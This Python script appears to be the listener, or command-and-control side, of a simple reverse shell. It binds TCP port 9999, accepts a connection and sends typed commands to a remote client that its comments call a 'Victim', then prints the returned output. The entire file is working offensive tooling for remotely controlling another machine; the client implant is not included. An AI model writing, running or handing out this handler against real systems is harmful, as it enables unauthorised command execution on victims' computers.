import socket
import sys

#create a socket
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as e:
        print("Socket Creation Error:", str(e))
        sys.exit(1)

#binding the socket and listing for connection
def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding For The Port", str(port))
        s.bind((host, port))
        s.listen(5)

    except socket.error as e:
        print("Socket Binding Error:", str(e))
        sys.exit(1)

#Stablish Connection With  The Client
def socket_accept():
        conn,address = s.accept()

        print("Connection Has Been Stablished !  | IP:",address[0],"| Port:", str(address[1]))
        send_commands(conn)
        conn.close()


# Send command to client/Victim or Friend
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = conn.recv(1024)
            print(client_response.decode("utf-8", errors="ignore"), end="")


#Call the fonctions NB: "the fonction send_commands it will be calling in the fonction socket accept"
def main():
    create_socket()
    bind_socket()
    socket_accept()

main()
           
    